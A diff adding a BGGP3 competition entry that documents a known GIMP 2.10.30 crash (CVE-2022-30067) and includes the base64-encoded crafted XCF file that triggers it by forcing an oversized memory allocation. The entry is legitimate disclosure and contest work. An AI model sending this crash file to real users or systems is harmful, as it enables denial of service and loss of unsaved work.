@@ -1,0 +1,15 @@
+---BEGIN BGGP3 ENTRY---
+Name or handle: junyian
+Website, twitter, other online presence: https://junyian.github.io
+Target Software and Version: GIMP 2.10.30
+Description of Target Software's Environment (Platform/OS, Setup Instructions, etc.): Windows (Linux should work fine too)
+Target File Type: XCF, native image format for GIMP
+SHA256 Hash: 00719a3c19d220339088da5713af8173248a9c97166253e662e081d9463e2f99
+Brief Description of Crash: Crafted XCF file that causes GIMP to try allocate too much memory, then fails with an unhandled exception and program quits with a "Unspecified fatal error encountered, aborting".
+Was this a new crash, or a known bug?: Known bug
+Link to PoC video, screenshot, or console output, if any: N/A
+Link to writeup, if any: https://junyian.github.io/posts/bggp3/
+CVE or other acknowledgement, if any: https://gitlab.gnome.org/GNOME/gimp/-/issues/8120, CVE-2022-30067
+File contents (base64 encoded please):
+Z2ltcCB4Y2YgZmlsZQAAAAACAAAAAgAAAAAAAAAXAAAABAAAAAIAAAAWAAAABAAAAAEAAAAVAAABNwBSyMM5AAAAAQ==
+---END BGGP3 ENTRY---
